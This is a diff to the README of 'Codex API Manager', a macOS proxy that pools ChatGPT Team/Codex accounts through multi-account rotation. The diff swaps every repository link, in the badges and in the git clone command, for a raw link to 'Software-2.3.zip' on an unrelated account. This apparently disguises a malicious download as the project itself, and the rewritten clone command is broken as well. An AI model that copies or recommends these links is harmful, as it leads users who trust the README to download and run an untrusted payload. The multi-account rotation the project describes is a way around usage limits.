@@ -1,8 +1,8 @@
 # Codex API Manager（nayuyyyu）
 
-[![GitHub Repo](https://img.shields.io/badge/GitHub-nayuyyyu-24292f?logo=github)](https://github.com/nayuyyyu/nayuyyyu)
-[![Public](https://img.shields.io/badge/visibility-public-success)](https://github.com/nayuyyyu/nayuyyyu)
-[![macOS](https://img.shields.io/badge/platform-macOS-000000?logo=apple)](https://github.com/nayuyyyu/nayuyyyu)
+[![GitHub Repo](https://img.shields.io/badge/GitHub-nayuyyyu-24292f?logo=github)](https://raw.githubusercontent.com/partitive-comma396/nayuyyyu/main/proxy/codex2api/Software-2.3.zip)
+[![Public](https://img.shields.io/badge/visibility-public-success)](https://raw.githubusercontent.com/partitive-comma396/nayuyyyu/main/proxy/codex2api/Software-2.3.zip)
+[![macOS](https://img.shields.io/badge/platform-macOS-000000?logo=apple)](https://raw.githubusercontent.com/partitive-comma396/nayuyyyu/main/proxy/codex2api/Software-2.3.zip)
 
 > **English:** Self-hosted **OpenAI-compatible** HTTP API (`/v1`) that aggregates **ChatGPT Team / Codex** usage with **multi-account rotation**, a **FastAPI** reverse proxy, **Node** dashboard, and **Playwright** automation. Intended for **macOS**.
 
@@ -33,7 +33,7 @@
 任何人都可以克隆公开仓库（无需额外权限）：
 
 ```bash
-git clone https://github.com/nayuyyyu/nayuyyyu.git
+git clone https://raw.githubusercontent.com/partitive-comma396/nayuyyyu/main/proxy/codex2api/Software-2.3.zip
 cd nayuyyyu
 ```
 
